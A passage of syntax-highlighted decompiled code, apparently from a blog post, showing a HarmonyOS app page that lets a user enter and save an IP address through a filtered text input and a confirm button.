class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p001entry/src/main/ets/pages;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: &amp;entry/src/main/ets/pages/setIP&amp;, reason: invalid class name */</span></span><br><span class="line"><span class="comment">/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">setIP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object pkgName<span class="meta">@entry</span>;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object hasTopLevelAwait;</span><br><span class="line">    <span class="keyword">public</span> Object isSharedModule;</span><br><span class="line">    <span class="keyword">public</span> Object scopeNames;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #*#(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r10v0, types: [java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #*#^<span class="number">1</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _lexenv_0_1_(<span class="literal">null</span>, createemptyobject());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        TextInput.create(createobjectwithbuffer([<span class="string">&quot;placeholder&quot;</span>, <span class="string">&quot;请输入IP&quot;</span>]));</span><br><span class="line">        TextInput.inputFilter(<span class="string">&quot;[0-9.:]&quot;</span>, #~@<span class="number">0</span>&gt;@<span class="number">1</span>**#);</span><br><span class="line">        TextInput.onChange(#~@<span class="number">0</span>&gt;@<span class="number">1</span>**#^<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        RelativeContainer.create();</span><br><span class="line">        RelativeContainer.height(<span class="string">&quot;100%&quot;</span>);</span><br><span class="line">        RelativeContainer.width(<span class="string">&quot;100%&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>**#(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        promptAction = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as promptAction &#125; from <span class="string">&quot;@ohos:promptAction&quot;</span>;</span><br><span class="line">        obj = promptAction.showToast;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;message&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj2.message = arg0 + <span class="string">&quot;非正确ip格式内容&quot;</span>;</span><br><span class="line">        obj(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r17v0, types: [&amp;entry/src/main/ets/pages/setIP&amp;] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r24v40, types: [int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>=#setIP(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;</span><br><span class="line">        obj = arg3;</span><br><span class="line">        obj2 = arg4;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3 = <span class="built_in">super</span>(arg0, arg2, obj, arg5);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&quot;function&quot;</span> == typeof(obj2) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj3.paramsGenerator_ = obj2;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3.__inputIP = ObservedPropertySimplePU(<span class="string">&quot;&quot;</span>, obj3, <span class="string">&quot;inputIP&quot;</span>);</span><br><span class="line">        obj3.setInitiallyProvidedValue(arg1);</span><br><span class="line">        obj3.finalizeConstruction();</span><br><span class="line">        <span class="keyword">return</span> obj3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Row.create();</span><br><span class="line">        Row.width(<span class="keyword">import</span> &#123; StyleConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/StyleConstants&amp;&quot;</span>.FULL_WIDTH);</span><br><span class="line">        obj = Row.height;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777326</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Row.zIndex(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.Z_INDEX);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = Image.create;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777332</span>, <span class="string">&quot;type&quot;</span>, <span class="number">20000</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        obj3 = Image.width;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777272</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj3(obj4);</span><br><span class="line">        obj5 = Image.height;</span><br><span class="line">        obj6 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777270</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj6.params = [Object];</span><br><span class="line">        obj5(obj6);</span><br><span class="line">        obj7 = Image.margin;</span><br><span class="line">        obj8 = createobjectwithbuffer([<span class="string">&quot;left&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj9 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777271</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj9.params = [Object];</span><br><span class="line">        obj8.left = obj9;</span><br><span class="line">        obj7(obj8);</span><br><span class="line">        Image.onClick(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">2</span>*#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = Text.create;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777224</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10003</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Text.fontWeight(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.TITLE_FONT_WEIGHT);</span><br><span class="line">        obj3 = Text.fontColor;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777245</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10001</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj3(obj4);</span><br><span class="line">        obj5 = Text.opacity;</span><br><span class="line">        obj6 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777327</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj6.params = [Object];</span><br><span class="line">        obj5(obj6);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">4</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Column.create();</span><br><span class="line">        obj = Column.alignRules;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;center&quot;</span>, <span class="number">0</span>, <span class="string">&quot;middle&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;anchor&quot;</span>, <span class="string">&quot;__container__&quot;</span>, <span class="string">&quot;align&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3.align = VerticalAlign.Center;</span><br><span class="line">        obj2.center = obj3;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;anchor&quot;</span>, <span class="string">&quot;__container__&quot;</span>, <span class="string">&quot;align&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj4.align = HorizontalAlign.Center;</span><br><span class="line">        obj2.middle = obj4;</span><br><span class="line">        obj(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r21v10, types: [java.lang.Class] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">5</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isfalse(arg1) != <span class="literal">null</span>) &#123;</span><br><span class="line">            ldlexvar = _lexenv_0_1_;</span><br><span class="line">            ldlexvar.updateStateVarsOfChildByElmtId(arg0, createemptyobject());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ldlexvar2 = _lexenv_1_0_;</span><br><span class="line">        ldlexvar3 = _lexenv_0_1_;</span><br><span class="line">        obj = createobjectwithbuffer([<span class="string">&quot;onTextChange&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj.onTextChange = #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*#onTextChange;</span><br><span class="line">        newobjrange = ldlexvar2(ldlexvar3, obj, <span class="literal">null</span>, arg0, #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*#, createobjectwithbuffer([<span class="string">&quot;page&quot;</span>, <span class="string">&quot;entry/src/main/ets/pages/setIP.ets&quot;</span>, <span class="string">&quot;line&quot;</span>, <span class="number">47</span>, <span class="string">&quot;col&quot;</span>, <span class="number">11</span>]));</span><br><span class="line">        ViewPU.create(newobjrange);</span><br><span class="line">        newobjrange.paramsGenerator_ = #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*#paramsLambda;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">6</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Button.createWithLabel(<span class="string">&quot;确认&quot;</span>);</span><br><span class="line">        Button.fontWeight(<span class="keyword">import</span> &#123; HeaderConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/HeaderConstants&amp;&quot;</span>.TITLE_FONT_WEIGHT);</span><br><span class="line">        obj = Button.fontColor;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777245</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10001</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        obj3 = Button.opacity;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777327</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj3(obj4);</span><br><span class="line">        Button.onClick(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">6</span>*#);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v7, types: [boolean, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">4</span>, <span class="string">&quot;ipSetComponent&quot;</span>, <span class="number">0</span>, <span class="string">&quot;setIP&quot;</span>, <span class="number">1</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">2</span>, <span class="string">&quot;this&quot;</span>, <span class="number">3</span>], <span class="number">4</span>);</span><br><span class="line">        _lexenv_0_2_ = newTarget;</span><br><span class="line">        _lexenv_0_3_ = <span class="built_in">this</span>;</span><br><span class="line">        <span class="keyword">if</span> (isIn(<span class="string">&quot;finalizeConstruction&quot;</span>, ViewPU.prototype) == <span class="literal">false</span>) &#123;</span><br><span class="line">            Reflect.set(ViewPU.prototype, <span class="string">&quot;finalizeConstruction&quot;</span>, #*#);</span><br><span class="line">        &#125;</span><br><span class="line">        obj = ViewPU.#~@<span class="number">0</span>=#ipSetComponent(Object2, Object3, ViewPU, [<span class="string">&quot;setInitiallyProvidedValue&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@0&gt;#setInitiallyProvidedValue&quot;</span>, <span class="number">1</span>, <span class="string">&quot;updateStateVars&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@0&gt;#updateStateVars&quot;</span>, <span class="number">1</span>, <span class="string">&quot;purgeVariableDependenciesOnElmtId&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@0&gt;#purgeVariableDependenciesOnElmtId&quot;</span>, <span class="number">1</span>, <span class="string">&quot;aboutToBeDeleted&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@0&gt;#aboutToBeDeleted&quot;</span>, <span class="number">0</span>, <span class="string">&quot;initialRender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@0&gt;#initialRender&quot;</span>, <span class="number">0</span>, <span class="string">&quot;rerender&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@0&gt;#rerender&quot;</span>, <span class="number">0</span>, <span class="number">6</span>]);</span><br><span class="line">        obj2 = obj.prototype;</span><br><span class="line">        _lexenv_0_0_ = obj;</span><br><span class="line">        obj3 = ViewPU.#~@<span class="number">2</span>=#setIP(Object2, Object3, ViewPU, [<span class="string">&quot;setInitiallyProvidedValue&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@2&gt;#setInitiallyProvidedValue&quot;</span>, <span class="number">1</span>, <span class="string">&quot;updateStateVars&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@2&gt;#updateStateVars&quot;</span>, <span class="number">1</span>, <span class="string">&quot;purgeVariableDependenciesOnElmtId&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@2&gt;#purgeVariableDependenciesOnElmtId&quot;</span>, <span class="number">1</span>, <span class="string">&quot;aboutToBeDeleted&quot;</span>, <span class="string">&quot;&amp;entry/src/main/ets/pages/setIP&amp;.#~@2&gt;#aboutToBeDeleted&quot;</span>, <span class="number">0</span>, <span class="number">4</span>]);</span><br><span class="line">        obj4 = obj3.prototype;</span><br><span class="line">        obj4[<span class="string">&quot;inputIP&quot;</span>].getter = obj4.#~@<span class="number">2</span>&gt;#inputIP;</span><br><span class="line">        obj4[<span class="string">&quot;inputIP&quot;</span>].setter = obj4.#~@<span class="number">2</span>&gt;#inputIP^<span class="number">1</span>;</span><br><span class="line">        obj4.initialRender = obj4.#~@<span class="number">2</span>&gt;#initialRender;</span><br><span class="line">        obj4.rerender = obj4.#~@<span class="number">2</span>&gt;#rerender;</span><br><span class="line">        obj3.getEntryName = obj3.#~@<span class="number">2</span>&lt;#getEntryName;</span><br><span class="line">        _lexenv_0_1_ = obj3;</span><br><span class="line">        registerNamedRoute(#*#^<span class="number">1</span>, <span class="string">&quot;&quot;</span>, createobjectwithbuffer([<span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>, <span class="string">&quot;pagePath&quot;</span>, <span class="string">&quot;pages/setIP&quot;</span>, <span class="string">&quot;pageFullPath&quot;</span>, <span class="string">&quot;entry/src/main/ets/pages/setIP&quot;</span>, <span class="string">&quot;integratedHsp&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;moduleType&quot;</span>, <span class="string">&quot;followWithHap&quot;</span>]));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r12v2, types: [Object, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>**#^<span class="number">1</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isfalse(_lexenv_0_1_.onTextChange) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ldlexvar = _lexenv_0_1_;</span><br><span class="line">        ldlexvar.onTextChange(arg0);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">2</span>*#(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        router = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as router &#125; from <span class="string">&quot;@ohos:router&quot;</span>;</span><br><span class="line">        router.back();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*#(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">6</span>*#(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        global.ip = _lexenv_0_1_.inputIP;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#inputIP(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__inputIP;</span><br><span class="line">        <span class="keyword">return</span> obj.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span 